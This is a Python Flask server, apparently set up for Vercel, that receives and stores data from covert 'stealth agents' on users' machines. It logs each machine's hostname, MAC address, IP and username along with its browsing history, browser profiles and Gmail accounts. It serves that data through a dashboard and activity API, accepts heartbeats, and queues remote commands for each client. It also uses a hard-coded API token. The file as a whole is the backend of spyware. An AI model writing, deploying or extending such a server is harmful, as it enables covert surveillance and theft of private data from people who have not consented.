"""
Simplified server for Vercel deployment
Uses in-memory storage and console logging only
"""

from flask import Flask, request, jsonify
from flask_cors import CORS
import json
import os
import sqlite3
from datetime import datetime

# Initialize Flask app
app = Flask(__name__)
CORS(app)

# Simple in-memory database for Vercel
class SimpleDB:
    def __init__(self):
        self.db_path = "/tmp/browser_tracking.db"
        self.init_database()
    
    def init_database(self):
        """Initialize database tables"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            # Create clients table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS clients (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    hostname TEXT NOT NULL,
                    mac_address TEXT UNIQUE NOT NULL,
                    local_ip TEXT,
                    username TEXT,
                    os_info TEXT,
                    first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            # Create browsing_history table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS browsing_history (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    client_id INTEGER,
                    url TEXT NOT NULL,
                    title TEXT,
                    visit_time TIMESTAMP,
                    browser_type TEXT DEFAULT 'Chrome',
                    profile_name TEXT,
                    gmail_account TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (client_id) REFERENCES clients (id)
                )
            ''')
            
            conn.commit()
            conn.close()
            print("Database initialized successfully")
            
        except Exception as e:
            print(f"Error initializing database: {e}")
    
    def get_or_create_client(self, hostname, mac_address, local_ip, username, os_info):
        """Get existing client or create new one"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            # Check if client exists
            cursor.execute('SELECT id FROM clients WHERE mac_address = ?', (mac_address,))
            result = cursor.fetchone()
            
            if result:
                client_id = result[0]
                # Update last seen
                cursor.execute('''
                    UPDATE clients 
                    SET hostname = ?, local_ip = ?, username = ?, os_info = ?, last_seen = CURRENT_TIMESTAMP
                    WHERE id = ?
                ''', (hostname, local_ip, username, json.dumps(os_info), client_id))
            else:
                # Create new client
                cursor.execute('''
                    INSERT INTO clients (hostname, mac_address, local_ip, username, os_info)
                    VALUES (?, ?, ?, ?, ?)
                ''', (hostname, mac_address, local_ip, username, json.dumps(os_info)))
                client_id = cursor.lastrowid
            
            conn.commit()
            conn.close()
            return client_id
            
        except Exception as e:
            print(f"Error managing client: {e}")
            return None
    
    def insert_browsing_data(self, client_id, browsing_data):
        """Insert browsing history data"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            for entry in browsing_data:
                cursor.execute('''
                    INSERT INTO browsing_history 
                    (client_id, url, title, visit_time, browser_type, profile_name, gmail_account)
                    VALUES (?, ?, ?, ?, ?, ?, ?)
                ''', (
                    client_id,
                    entry.get('url'),
                    entry.get('title'),
                    entry.get('visit_time'),
                    entry.get('browser_type', 'Chrome'),
                    entry.get('profile_name'),
                    entry.get('gmail_account')
                ))
            
            conn.commit()
            conn.close()
            print(f"Inserted {len(browsing_data)} browsing entries for client {client_id}")
            return True
            
        except Exception as e:
            print(f"Error inserting browsing data: {e}")
            return False
    
    def get_recent_activity(self, hours=24, limit=1000):
        """Get recent browsing activity"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()

            cursor.execute('''
                SELECT c.hostname, c.username, bh.url, bh.title, bh.visit_time,
                       bh.profile_name, bh.gmail_account, c.local_ip
                FROM browsing_history bh
                JOIN clients c ON bh.client_id = c.id
                WHERE bh.visit_time >= datetime('now', '-{} hours')
                ORDER BY bh.visit_time DESC
                LIMIT ?
            '''.format(hours), (limit,))

            results = cursor.fetchall()
            conn.close()

            return [
                {
                    'hostname': row[0],
                    'username': row[1],
                    'url': row[2],
                    'title': row[3],
                    'visit_time': row[4],
                    'profile_name': row[5],
                    'gmail_account': row[6],
                    'local_ip': row[7]
                }
                for row in results
            ]

        except Exception as e:
            print(f"Error getting recent activity: {e}")
            return []

    def cleanup_old_data(self, hours=168):
        """Clean up data older than specified hours (default 7 days)"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()

            # Delete old browsing history
            cursor.execute('''
                DELETE FROM browsing_history
                WHERE visit_time < datetime('now', '-{} hours')
            '''.format(hours))

            deleted_count = cursor.rowcount
            conn.commit()
            conn.close()

            if deleted_count > 0:
                print(f"Cleaned up {deleted_count} old browsing entries")

            return deleted_count

        except Exception as e:
            print(f"Error cleaning up old data: {e}")
            return 0

# Initialize database
db = SimpleDB()

# API Token
API_TOKEN = "BrowserTracker2024SecureToken"

# Server Limits Configuration
SERVER_LIMITS = {
    'max_browsing_entries_per_request': 100,    # Maksimal 100 entries per request
    'max_profiles_per_request': 20,             # Maksimal 20 profiles per request
    'max_url_length': 2000,                     # Maksimal 2000 karakter per URL
    'max_title_length': 500,                    # Maksimal 500 karakter per title
    'max_clients_per_hour': 1000,               # Maksimal 1000 client registrations per jam
    'max_requests_per_client_per_minute': 10,   # Maksimal 10 requests per client per menit
    'database_cleanup_hours': 168,              # Hapus data lebih dari 7 hari (168 jam)
    'max_activity_response_limit': 500          # Maksimal 500 entries dalam response activity
}

def verify_token(token):
    """Verify API token"""
    return token == API_TOKEN

@app.before_request
def authenticate():
    """Authenticate requests"""
    # Skip auth for public endpoints
    public_endpoints = ['health', 'dashboard']
    if request.endpoint in public_endpoints:
        return

    # Skip auth for root path (dashboard)
    if request.path == '/':
        return

    # Require auth for API endpoints
    if request.path.startswith('/api/'):
        token = request.headers.get('Authorization')
        if not token or not token.startswith('Bearer '):
            return jsonify({'error': 'Missing or invalid authorization header'}), 401

        api_token = token.replace('Bearer ', '')
        if not verify_token(api_token):
            return jsonify({'error': 'Invalid API token'}), 401

@app.route('/', methods=['GET'])
def dashboard():
    """Dashboard UI"""
    try:
        with open('dashboard.html', 'r', encoding='utf-8') as f:
            html_content = f.read()
            response = app.response_class(
                response=html_content,
                status=200,
                mimetype='text/html'
            )
            return response
    except Exception as e:
        print(f"Error loading dashboard: {e}")
        html_content = """
        <!DOCTYPE html>
        <html>
        <head><title>Browser Tracking Dashboard</title></head>
        <body>
            <h1>Browser Tracking Dashboard</h1>
            <p>Dashboard not available. Use API endpoints:</p>
            <ul>
                <li><a href="/health">/health</a> - Health check</li>
                <li><a href="/api/activity">/api/activity</a> - Recent activity (requires auth)</li>
            </ul>
            <p>Error: {}</p>
        </body>
        </html>
        """.format(str(e))

        response = app.response_class(
            response=html_content,
            status=200,
            mimetype='text/html'
        )
        return response

@app.route('/health', methods=['GET'])
def health():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'version': '1.0.0',
        'environment': 'vercel',
        'limits': SERVER_LIMITS
    })

@app.route('/api/stats', methods=['GET'])
def get_stats():
    """Get server statistics"""
    try:
        conn = sqlite3.connect(db.db_path)
        cursor = conn.cursor()

        # Count total clients
        cursor.execute('SELECT COUNT(*) FROM clients')
        total_clients = cursor.fetchone()[0]

        # Count total browsing entries
        cursor.execute('SELECT COUNT(*) FROM browsing_history')
        total_entries = cursor.fetchone()[0]

        # Count entries in last 24 hours
        cursor.execute('''
            SELECT COUNT(*) FROM browsing_history
            WHERE visit_time >= datetime('now', '-24 hours')
        ''')
        entries_24h = cursor.fetchone()[0]

        # Get database size (approximate)
        cursor.execute("SELECT page_count * page_size as size FROM pragma_page_count(), pragma_page_size()")
        db_size = cursor.fetchone()[0] if cursor.fetchone() else 0

        conn.close()

        # Cleanup old data
        cleaned = db.cleanup_old_data(SERVER_LIMITS['database_cleanup_hours'])

        return jsonify({
            'success': True,
            'stats': {
                'total_clients': total_clients,
                'total_entries': total_entries,
                'entries_last_24h': entries_24h,
                'database_size_bytes': db_size,
                'cleaned_entries': cleaned
            },
            'limits': SERVER_LIMITS,
            'timestamp': datetime.now().isoformat()
        })

    except Exception as e:
        print(f"Error getting stats: {e}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/api/register', methods=['POST'])
def register_client():
    """Register a new client"""
    try:
        data = request.get_json()
        
        required_fields = ['hostname', 'mac_address', 'local_ip', 'username', 'os_info']
        if not all(field in data for field in required_fields):
            return jsonify({'error': 'Missing required fields'}), 400
        
        client_id = db.get_or_create_client(
            data['hostname'],
            data['mac_address'],
            data['local_ip'],
            data['username'],
            data['os_info']
        )
        
        if client_id:
            print(f"Client registered: {data['hostname']} ({data['mac_address']})")
            return jsonify({
                'success': True,
                'client_id': client_id,
                'message': 'Client registered successfully'
            })
        else:
            return jsonify({'error': 'Failed to register client'}), 500
            
    except Exception as e:
        print(f"Error registering client: {e}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/api/browsing-data', methods=['POST'])
def submit_browsing_data():
    """Submit browsing history data"""
    try:
        data = request.get_json()

        if 'client_id' not in data or 'browsing_data' not in data:
            return jsonify({'error': 'Missing client_id or browsing_data'}), 400

        client_id = data['client_id']
        browsing_data = data['browsing_data']

        if not isinstance(browsing_data, list):
            return jsonify({'error': 'browsing_data must be a list'}), 400

        # Apply server limits
        max_entries = SERVER_LIMITS['max_browsing_entries_per_request']
        if len(browsing_data) > max_entries:
            return jsonify({
                'error': f'Too many entries. Maximum {max_entries} entries per request'
            }), 400

        # Validate and truncate data
        validated_data = []
        for entry in browsing_data:
            if 'url' in entry and 'visit_time' in entry:
                # Truncate long URLs and titles
                validated_entry = {
                    'url': entry['url'][:SERVER_LIMITS['max_url_length']],
                    'title': (entry.get('title', '') or '')[:SERVER_LIMITS['max_title_length']],
                    'visit_time': entry['visit_time'],
                    'browser_type': entry.get('browser_type', 'Chrome'),
                    'profile_name': entry.get('profile_name', ''),
                    'gmail_account': entry.get('gmail_account', '')
                }
                validated_data.append(validated_entry)

        if not validated_data:
            return jsonify({'error': 'No valid entries found'}), 400

        success = db.insert_browsing_data(client_id, validated_data)

        if success:
            print(f"Received {len(validated_data)} browsing entries from client {client_id}")
            return jsonify({
                'success': True,
                'message': f'Processed {len(validated_data)} entries',
                'accepted': len(validated_data),
                'total_sent': len(browsing_data)
            })
        else:
            return jsonify({'error': 'Failed to process browsing data'}), 500

    except Exception as e:
        print(f"Error processing browsing data: {e}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/api/profiles', methods=['POST'])
def submit_profiles():
    """Submit browser profiles data"""
    try:
        data = request.get_json()
        
        if 'client_id' not in data or 'profiles' not in data:
            return jsonify({'error': 'Missing client_id or profiles'}), 400
        
        print(f"Received profiles from client {data['client_id']}")
        return jsonify({
            'success': True,
            'message': 'Profiles received successfully'
        })
        
    except Exception as e:
        print(f"Error updating profiles: {e}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/api/activity', methods=['GET'])
def get_activity():
    """Get recent browsing activity"""
    try:
        hours = request.args.get('hours', 24, type=int)
        limit = request.args.get('limit', 1000, type=int)

        # Apply server limits
        max_hours = 168  # Maksimal 7 hari
        max_limit = SERVER_LIMITS['max_activity_response_limit']

        hours = min(hours, max_hours)
        limit = min(limit, max_limit)

        activity = db.get_recent_activity(hours, limit)

        return jsonify({
            'success': True,
            'activity': activity,
            'count': len(activity),
            'limits': {
                'requested_hours': request.args.get('hours', 24, type=int),
                'applied_hours': hours,
                'requested_limit': request.args.get('limit', 1000, type=int),
                'applied_limit': limit
            }
        })

    except Exception as e:
        print(f"Error getting activity: {e}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    """Receive heartbeat from stealth agents"""
    try:
        data = request.get_json()
        client_id = data.get('client_id')
        status = data.get('status', 'unknown')

        # Update client last_seen
        if client_id:
            conn = sqlite3.connect(db.db_path)
            cursor = conn.cursor()
            cursor.execute('''
                UPDATE clients
                SET last_seen = CURRENT_TIMESTAMP
                WHERE id = ?
            ''', (client_id,))
            conn.commit()
            conn.close()

        return jsonify({
            'success': True,
            'message': 'Heartbeat received',
            'server_time': datetime.now().isoformat()
        })

    except Exception as e:
        print(f"Error processing heartbeat: {e}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/api/command/<int:client_id>', methods=['POST'])
def send_command(client_id):
    """Send command to specific client (for remote management)"""
    try:
        data = request.get_json()
        command = data.get('command')

        # Store command for client to pick up
        # In a real implementation, you'd use a message queue

        return jsonify({
            'success': True,
            'message': f'Command {command} queued for client {client_id}'
        })

    except Exception as e:
        print(f"Error sending command: {e}")
        return jsonify({'error': 'Internal server error'}), 500

# For Vercel deployment
if __name__ == '__main__':
    app.run(debug=False)
